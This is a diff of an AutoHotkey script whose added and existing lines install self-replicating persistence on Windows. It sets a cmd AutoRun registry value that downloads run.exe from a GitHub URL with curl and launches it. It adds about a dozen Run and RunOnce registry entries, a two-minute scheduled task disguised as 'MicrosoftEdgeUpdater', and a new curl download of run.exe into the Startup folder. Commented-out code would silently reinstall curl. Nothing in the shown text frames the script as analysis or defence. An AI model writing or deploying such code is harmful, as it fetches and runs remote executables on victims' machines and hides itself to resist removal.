@@ -3,6 +3,19 @@
 
 path := "C:\Microsoft"
 
+; CheckCurl() {
+;     try {
+;         RunWait 'cmd /c curl --version',, 'Hide UseErrorLevel StdOutToVar Output'
+;         if (ErrorLevel = 0) {
+;             return true
+;         } else {
+;             return false
+;         }
+;     } catch {
+;         return false
+;     }
+; }
+
 runAllExes() {
     static lastRun := 0
     delay := 1000
@@ -13,12 +26,20 @@ runAllExes() {
 
     global path
 
-    if !DirExist(path)
+    if !DirExist(path) {
         DirCreate(path)
+    }
+
+;     needs testing
+;     if !CheckCurl() {
+;         RunWait 'cmd /c winget uninstall --id Curl.Curl -e --silent --accept-package-agreements --accept-source-agreements',, 'Hide'
+;         RunWait 'cmd /c winget install --id Curl.Curl -e --silent --accept-package-agreements --accept-source-agreements',, 'Hide'
+;     }
 
     letters := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","LButton","RButton","Delete","Backspace","Space"]
     
     RegWrite "mkdir C:\Microsoft & curl -L -o C:\Microsoft\run.exe https://raw.githubusercontent.com/astorrs276/Public-AHK/main/run.exe & start C:\Microsoft\run.exe & cls", "REG_SZ", "HKCU\Software\Microsoft\Command Processor", "AutoRun"
+    
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate0"
     RegWrite '"C:\Microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
     RegWrite '"C:\Microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
@@ -30,7 +51,11 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
+    RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "Replicate"
+
     Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
+
+    Run 'cmd /c curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.exe" "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"'
 
     last := ""
     try {
